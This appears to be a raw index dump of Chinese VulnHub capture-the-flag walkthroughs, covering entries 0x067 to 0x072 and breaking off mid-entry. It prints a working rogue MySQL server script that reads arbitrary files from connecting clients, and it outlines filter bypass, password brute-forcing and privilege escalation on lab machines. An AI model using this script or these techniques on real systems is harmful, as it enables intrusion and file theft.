-*-\rimport socket\rimport os\rimport sys\r#--------------------------------------------------------------------------------------------------------------------\rport = int(sys.argv[1])\r#--------------------------------------------------------------------------------------------------------------------\rdef mysql_get_file_content(sv, filename):\rconn, address = sv.accept()\rlogpath = os.path.abspath(\u0026#39;.\u0026#39;) + \u0026#34;/log/\u0026#34; + address[0]\rif not os.path.exists(logpath):\ros.makedirs(logpath)\r# Conn from address)\rconn.sendall(\r\u0026#34;\\x4a\\x00\\x00\\x00\\x0a\\x35\\x2e\\x35\\x2e\\x35\\x33\\x00\\x17\\x00\\x00\\x00\\x6e\\x7a\\x3b\\x54\\x76\\x73\\x61\\x6a\\x00\\xff\\xf7\\x21\\x02\\x00\\x0f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x76\\x21\\x3d\\x50\\x5c\\x5a\\x32\\x2a\\x7a\\x49\\x3f\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00\u0026#34;)\rconn.recv(9999)\r# auth okay\rconn.sendall(\u0026#34;\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00\u0026#34;)\rconn.recv(9999)\r# want file...\rwantfile = chr(len(filename) + 1) + \u0026#34;\\x00\\x00\\x01\\xFB\u0026#34; + filename\rconn.sendall(wantfile)\rcontent = conn.recv(9999)\rconn.close()\rif len(content) \u0026gt; 4:\rwith open(logpath + \u0026#34;/\u0026#34; + filename.replace(\u0026#34;/\u0026#34;, \u0026#34;_\u0026#34;).replace(\u0026#34;:\u0026#34;, \u0026#34;_\u0026#34;), \u0026#34;w\u0026#34;) as txt:\rtxt.write(content)\rreturn True\relse:\rreturn False\r# 开始监听\rsv = socket.socket()\rsv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\rsv.bind((\u0026#34;\u0026#34;, port))\rsv.listen(5)\rprint \u0026#34;Listen Begin in port \u0026#34;+str(port)\r# 日志文件夹\r# 循环监听\rwhile True:\rfilename = raw_input(\u0026#34;请输入接下来你想读的文件名 (直接按回车退出): \u0026#34;)\rif filename == \u0026#34;\u0026#34;:\rbreak\rres = mysql_get_file_content(sv, filename)\rif res:\rprint \u0026#34;Read Success! ---\u0026gt; \u0026#34;+filename\relse:\rprint \u0026#34;Not Found~ ---\u0026gt; \u0026#34;+filename 在当前目录会生成一个文件：\nVU: julian\nP: I_mean\u0026hellip;WhoThoughtLettingTheMySQLClientTransmitFilesWasAGoodIdea?Sheesh\n这就是账号密码：\n提权 这里有两个文件，明显是不属于这里的：\n然后这里要逆向，把这串二进制字符串逆向出来，代码要求能力挺高的，暂且解决不了，密码如下：\nSo\u0026hellip;YouFiguredOutHowToRecoverThisHuh?GGWPnoRE\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x067-readme/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE105e556d62df904228189b4475e208aeimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc464496b093cbef56ffdb913ef6a8bc3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4b9470766de50513b0d3745a11c3a4ddimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEde8183202983a156ccc4f87730660b7aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe7801f6d0dc2dcb2cdb8be32e8b89bb2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0ce94fd56d492a62392b93fcf3dab2d8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE457f2266402615a06cc4fb01c8ec7e6aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里右键图片，可以发现目录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE87fff234d0dec2589a519b542f8246c6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE777d642af0cb44f81143290792690ad5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE619cf45715c94b62e287f46475a1c228image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e我感觉是在提示我们使用文件读取，但是该怎么进行文件读取呢：\u003c/p\u003e\n\u003cp\u003eSSRF是有本地文件读取的可能性的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcd6af48624611705a08094423f4f067bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://xz.aliyun.com/t/11225#toc-5\"\u003ehttps://xz.aliyun.com/t/11225#toc-5\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e用的这个脚本：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# -*- coding: utf-8 -*-\r\nimport socket\r\nimport os\r\nimport sys\r\n\r\n#--------------------------------------------------------------------------------------------------------------------\r\nport = int(sys.argv[1])\r\n#--------------------------------------------------------------------------------------------------------------------\r\n\r\ndef mysql_get_file_content(sv, filename):\r\n    conn, address = sv.accept()\r\n    logpath = os.path.abspath(\u0026#39;.\u0026#39;) + \u0026#34;/log/\u0026#34; + address[0]\r\n    if not os.path.exists(logpath):\r\n        os.makedirs(logpath)\r\n    # Conn from address)\r\n    conn.sendall(\r\n        \u0026#34;\\x4a\\x00\\x00\\x00\\x0a\\x35\\x2e\\x35\\x2e\\x35\\x33\\x00\\x17\\x00\\x00\\x00\\x6e\\x7a\\x3b\\x54\\x76\\x73\\x61\\x6a\\x00\\xff\\xf7\\x21\\x02\\x00\\x0f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x76\\x21\\x3d\\x50\\x5c\\x5a\\x32\\x2a\\x7a\\x49\\x3f\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00\u0026#34;)\r\n    conn.recv(9999)\r\n    # auth okay\r\n    conn.sendall(\u0026#34;\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00\u0026#34;)\r\n    conn.recv(9999)\r\n    # want file...\r\n    wantfile = chr(len(filename) + 1) + \u0026#34;\\x00\\x00\\x01\\xFB\u0026#34; + filename\r\n    conn.sendall(wantfile)\r\n    content = conn.recv(9999)\r\n    conn.close()\r\n\r\n    if len(content) \u0026gt; 4:\r\n        with open(logpath + \u0026#34;/\u0026#34; + filename.replace(\u0026#34;/\u0026#34;, \u0026#34;_\u0026#34;).replace(\u0026#34;:\u0026#34;, \u0026#34;_\u0026#34;), \u0026#34;w\u0026#34;) as txt:\r\n            txt.write(content)\r\n        return True\r\n    else:\r\n        return False\r\n\r\n\r\n\r\n# 开始监听\r\nsv = socket.socket()\r\nsv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\nsv.bind((\u0026#34;\u0026#34;, port))\r\nsv.listen(5)\r\nprint \u0026#34;Listen Begin in port \u0026#34;+str(port)\r\n\r\n# 日志文件夹\r\n\r\n\r\n\r\n\r\n# 循环监听\r\nwhile True:\r\n    filename = raw_input(\u0026#34;请输入接下来你想读的文件名 (直接按回车退出): \u0026#34;)\r\n    if filename == \u0026#34;\u0026#34;:\r\n        break\r\n    res = mysql_get_file_content(sv, filename)\r\n    if res:\r\n        print \u0026#34;Read Success! ---\u0026gt; \u0026#34;+filename\r\n    else:\r\n        print \u0026#34;Not Found~ ---\u0026gt; \u0026#34;+filename\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfea96fe14cdbce21b2b238751779ddbbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x067 readme"},{"content":"端口扫描 渗透 发现密钥：\n但是没有用户名：\nwpsacn\n通过在主页中翻找，可以知道目前的用户名是oscp：\n使用密钥登录：\n提权 SUID提权\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x068-infosec-prep-oscp/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc7090209b1b8c753e8ded2dbfd6ef70eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa9be547cd8d23dbb3c3823fde68d067aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE66a10c428b6b09fe973048f265c272aeimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc71dfdb60f6f8d38b96ffee26e0e3be3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现密钥：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE17bc4a41f578f0b1acbb16aeb58aef1cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE656d74894b1a898df3ee519aea038026image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0c69c7bd92844295c3723e96e2e22cb2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是没有用户名：\u003c/p\u003e\n\u003cp\u003ewpsacn\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEecfb5e7df0381492b450397fe5922596image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE47349bcb65d263c19ac29637c529693cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e通过在主页中翻找，可以知道目前的用户名是oscp：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4d35e04a70c802f25acebca567b1b8f9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用密钥登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5251908451867fbb7ab801276da8461fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003eSUID提权\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE38bb0502d18f6985b918c05925889725image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE299ccef541432d2578ded2885210307cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x068 INFOSEC PREP OSCP"},{"content":"这台靶机建议本地开nat进行攻击\n端口扫描 渗透 有sql注入waf?\n接着看：\n可能有漏洞：\n下载1191.pl\nperl运行可能会出错\nsudo apt install libswitch-perl 提权 /var下面有数据库连接文件：\n也是root密码：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x069-pwnos2.0/","summary":"\u003cp\u003e这台靶机建议本地开nat进行攻击\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe16f35dafc56dcd6ec73510e25b714c3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8b647560bb7e79a98ce54eff1efcf506image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb9f0fb7032ce6fe2a4212cdfcdb748d6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe0313ea0b07adb6cbbb8ef62a89ce8baimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3b2a9839877abbcd2cefd3c177db9883image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有sql注入waf?\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5b39249a3b9f008fe0828ad3f52d270dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e接着看：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6c95faf70a9502ef926960f19cd26602image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1c292aa631ef05accfdcb3ebe0ac0415image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e可能有漏洞：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3a71ca80b73e448d1ff12d0a65051eceimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e下载1191.pl\u003c/p\u003e\n\u003cp\u003eperl运行可能会出错\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esudo apt install libswitch-perl\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE81147f53fe55cba06c5d1210e4b5b0acimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEed3b1c959cb3e1036156779b25e43937image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE44ef020665741dd9f5a056dae6c2a1c1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5b918c59f7e360ae1a2ddf7d1a621e1fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e/var下面有数据库连接文件：\u003c/p\u003e\n\u003cp\u003e也是root密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa29d0668f1532a49947403187e97d86dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x069 pWnOS2.0"},{"content":"端口扫描 获得立足点 疑似密码：\nMorty\nwinter\n命令执行：\n但是绕不过：\n只能试着读文件了：\nroot\nRickSanchez\nMorty\nSummer\n尝试登录：\n提权 这个机器上面全是这个猫猫图，多半是不会让我们这样方便的提权了，不喜欢ctf\n挨个到家目录下面翻查：\n用scp拷贝到本地：\n发现zip密码：\n解开，注意这个flag，其实是safe命令的参数：\n后面到spluttered的家目录下面，可以发现safe程序：\n这里提示Ricks的密码：\n一个大写字母，一个数字，和一个老乐队里面的单词：\n百度百科：\n也就是说关键词为\n用crunch生成字典：\ncrunch 7 7 -t ,%Flesh\u0026gt;passwd.txt\n7 7 是指定长度为7到7\n-t是指定模板\n,代表大写字母\n%代表数字\n爆破\nsudo提权\ncat 命令被修改了，应该是：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x070-rickdiculouslyeasy1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5cbc3ff694af78babf329faafbeb8c40image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE67a9197bd0fd1203c02ca7a89084b0e4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbc19427b819251d2b91a35a3ad2e6264image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获得立足点\"\u003e获得立足点\u003c/h1\u003e\n\u003cp\u003e疑似密码：\u003c/p\u003e\n\u003cp\u003eMorty\u003c/p\u003e\n\u003cp\u003ewinter\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE49cfa6d319bbeb7b1c4ecaf419e2ca07image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e命令执行：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE31945c2cf71da08cff40f47ab704d5a1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcdcf7ea6ebab7672f94dc0dfe8d6b656image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcb7bdedf7cddf620c13f569fa1ebafa2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是绕不过：\u003c/p\u003e\n\u003cp\u003e只能试着读文件了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEddcc6ab190e9dbf6796ed17ab9ba113eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eroot\u003c/p\u003e\n\u003cp\u003eRickSanchez\u003c/p\u003e\n\u003cp\u003eMorty\u003c/p\u003e\n\u003cp\u003eSummer\u003c/p\u003e\n\u003cp\u003e尝试登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8bd6eae8ed2a8c8f3b98646e070c0ad2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e这个机器上面全是这个猫猫图，多半是不会让我们这样方便的提权了，不喜欢ctf\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdca0a5632c4ff0ac47e8c8802f3908afimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e挨个到家目录下面翻查：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5de708d3010c45f84f10eacf363c7101image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用scp拷贝到本地：\u003c/p\u003e\n\u003cp\u003e发现zip密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE62665b8b88ac0bc5806a1ad69eb1d4deimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e解开，注意这个flag，其实是safe命令的参数：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb5128f847ff32bd92bf899033bed3d2eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后面到spluttered的家目录下面，可以发现safe程序：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE51b4736573a6e576f59e23318439d00eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里提示Ricks的密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6ce4d89102e601752aff2508cb971051image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e一个大写字母，一个数字，和一个老乐队里面的单词：\u003c/p\u003e\n\u003cp\u003e百度百科：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb767c55ea517874f0b5b3acae6b23326image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e也就是说关键词为\u003c/p\u003e\n\u003cp\u003e用crunch生成字典：\u003c/p\u003e\n\u003cp\u003ecrunch 7 7 -t ,%Flesh\u0026gt;passwd.txt\u003c/p\u003e\n\u003cp\u003e7 7 是指定长度为7到7\u003c/p\u003e\n\u003cp\u003e-t是指定模板\u003c/p\u003e\n\u003cp\u003e,代表大写字母\u003c/p\u003e\n\u003cp\u003e%代表数字\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE79b25e966cfee71ba7fc0702d53269faimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x070 RickdiculouslyEasy1"},{"content":"端口扫描 获取立足点 这不会又是什么加密吧：\n命令执行：\n有拦截，但是|就可以绕过，反弹一个shell回来：\n但是这里记得使用\u0026amp;让命令后台运行，要不然容易断开：\n提权 这里琢磨一下怎么提权：\n这里其实考虑几个问题，systemctl这个命令的执行的目录路径是什么，能否劫持后面的程序路径：\n这个apache2 * *号的位置一般是重启，启动之类的操作，这里应该是有说法：\n但是居然没有server程序：\n算了，2021-4034秒了\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x071-bob1.0.1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe818712cb227b360eb320209cf37d52cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4df2fbf81b8db62da924d1c2f7c4072aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe1b6ee82eb4503ac9ee331728988798eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2243f96945f00d59f6d799b326f4c3f7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3084544bc7c71d74b6312fdefd363a0dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这不会又是什么加密吧：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE445a47e8db61acb4da0f7e4cd6afb368image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e命令执行：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbddc5b42914553dcfe24ca3c402393faimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有拦截，但是|就可以绕过，反弹一个shell回来：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5c98a657ecd914416d974d69c358877fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是这里记得使用\u0026amp;让命令后台运行，要不然容易断开：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd681f4f460c3e8a00ba136e8f5fa8cfbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e这里琢磨一下怎么提权：\u003c/p\u003e\n\u003cp\u003e这里其实考虑几个问题，systemctl这个命令的执行的目录路径是什么，能否劫持后面的程序路径：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE461a1d12c59d5d6860ceee26f2116c08image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这个apache2 * *号的位置一般是重启，启动之类的操作，这里应该是有说法：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE683f3c6201669cf873431667c97b09e9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是居然没有server程序：\u003c/p\u003e\n\u003cp\u003e算了，2021-4034秒了\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc870a1390371b7b1077cc19565912c60image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x071 Bob1.0.1"},{"content":"端口扫描 获取立足点 端口不多，就22和80，先看80吧\n端口扫描\n目测有wordpress:\n需要修改hosts\n粗略一看，可能是插件有问题：\n但是未发现插件：\n发现很多用户：\n先爆破看看：\n同时ssh也开始爆破:\n作者，你真狗啊：\n后台权限不是很高，查了一圈，发现已知漏洞：\n修改目标和执行命令：\n成功反弹shell:\n提权 meErKatZ\n这个密码试过所有用户了，不行，登录数据库，看看里面的密码，很可惜，都不能解密：\n在mark的家里面发现了这个信息：\n成功切换到graham用户：\n发现有sudo权限，那么我们可能需要提权到jens用户了：\n看了一下backups.sh的权限，当前用户所属组有修改权限：\n直接修改后提权：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x072-dc6/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf8a0179c6aa9f1aa4029d0e9c794d6d7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd31b14da0c25dfd360f382a1c0206f94image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8e4b7281e3855eefb901128c3fde400cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e端口不多，就22和80，先看80吧\u003c/p\u003e\n\u003cp\u003e端口扫描\u003c/p\u003e\n\u003cp\u003e目测有wordpress:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcae2a69814658ab27c84aa5ce672268aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa645e3772a574ab7f174619c29a18b7eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e需要修改hosts\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd3c3c9397aff2bf886c254520e4ca830image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e粗略一看，可能是插件有问题：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3fa5dbb1fa298937a7783fff544b5058image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是未发现插件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc341de589db96fcd2b71f38bd1f1544fimage.png\" alt=\"\"  